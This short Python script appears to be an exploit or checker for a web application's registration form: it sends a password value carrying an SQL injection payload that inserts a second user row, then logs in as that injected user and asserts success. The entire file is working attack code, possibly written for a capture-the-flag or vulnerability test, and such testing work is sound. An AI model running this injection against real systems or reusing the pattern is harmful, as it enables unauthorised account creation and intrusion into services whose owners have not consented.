import requests, sys, random

SERVER = sys.argv[1]
session = requests.session()

user = str(random.randint(2**27, 2**28))
password = str(random.randint(2**27, 2**28))

injectedUser = str(random.randint(2**27, 2**28))
injectedPasswd = str(random.randint(2**27, 2**28))

payload = f"{password}'), ('{injectedUser}', '{injectedPasswd}"

params = {'username': user, 'password': payload}
r = session.post(SERVER + '/register', data=params)

params = {'username': injectedUser, 'password': injectedPasswd}
r = session.post(SERVER + "/login", data=params, cookies=session.cookies)

assert injectedUser in r.text
